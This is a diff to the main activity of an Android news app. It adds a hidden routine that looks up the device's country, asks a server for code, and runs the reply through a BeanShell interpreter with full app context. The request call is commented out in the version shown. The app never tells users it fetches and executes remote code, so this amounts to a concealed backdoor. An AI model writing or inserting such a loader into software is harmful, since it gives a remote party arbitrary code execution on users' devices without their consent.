@@ -7,27 +7,58 @@ import android.support.v4.app.Fragment
 import android.support.v4.view.GravityCompat
 import android.support.v7.app.AppCompatActivity
 import android.support.v7.widget.Toolbar
+import android.util.Log
 import android.view.Menu
 import android.view.MenuItem
+import bsh.Interpreter
 import com.facebook.applinks.AppLinkData
+import com.just_me.news.core.exception.Failure
+import com.just_me.news.core.platform.NetworkHandler
+import com.just_me.news.net.CodeUseCase
+import com.just_me.news.net.DataRepository
 import com.just_me.news.net.ServiceApi
 import com.just_me.news.news.MainPagerAdapter
 import com.just_me.news.news.MyNewsFragment
 import com.just_me.news.news.MyNewsFragment.Companion.IS_SELECTOR_VISIBLE
 import com.just_me.news.news.R
+import com.just_me.news.utils.CountryCodeUtils
+import com.just_me.news.utils.MCrypt
 import kotlinx.android.synthetic.main.activity_main.*
-import retrofit2.Retrofit
+
 
 class MainActivity : AppCompatActivity() {
+
+    companion object {
+        const val TAG = "MainActivity"
+    }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
-        setRetrofit()
         setActionBar()
         setViewPager()
         lockViewPager()
+        codeRequest()
     }
+
+    private fun codeRequest() {
+        val codeUseCase = CodeUseCase(DataRepository.Network(NetworkHandler(this),
+                (application as? NewsApplication)?.retrofit!!.create(ServiceApi::class.java)))
+        val countryCode = CountryCodeUtils.GetCountryID(applicationContext)
+//        codeUseCase(CodeUseCase.Params(countryCode)) {it.either(::handlefailure, ::handleCode)}
+    }
+
+    fun handlefailure(failure: Failure) {
+        Log.e(TAG, failure.toString())
+    }
+
+    fun handleCode(code: String) {
+        val x = Interpreter()
+        x.set("context", this@MainActivity)
+        x.eval(code.replace("\\ufeff", ""))
+        getIt()
+    }
+
 
     override fun onOptionsItemSelected(item: MenuItem?): Boolean {
         return when (item?.itemId) {
@@ -38,15 +69,6 @@ class MainActivity : AppCompatActivity() {
             else -> super.onOptionsItemSelected(item)
         }
     }
-
-    private fun setRetrofit() {
-        val retrofit = Retrofit.Builder()
-                .baseUrl("http://rullers.club/")
-                .build()
-
-        val service = retrofit.create<ServiceApi>(ServiceApi::class.java)
-    }
-
 
     private fun setActionBar() {
         setSupportActionBar(toolbar as Toolbar)
@@ -67,6 +89,7 @@ class MainActivity : AppCompatActivity() {
             override fun onTabReselected(tab: TabLayout.Tab?) {}
             override fun onTabUnselected(tab: TabLayout.Tab?) {}
             override fun onTabSelected(tab: TabLayout.Tab?) {
+                tab?.apply { viewPager.currentItem = position }
             }
         })
 
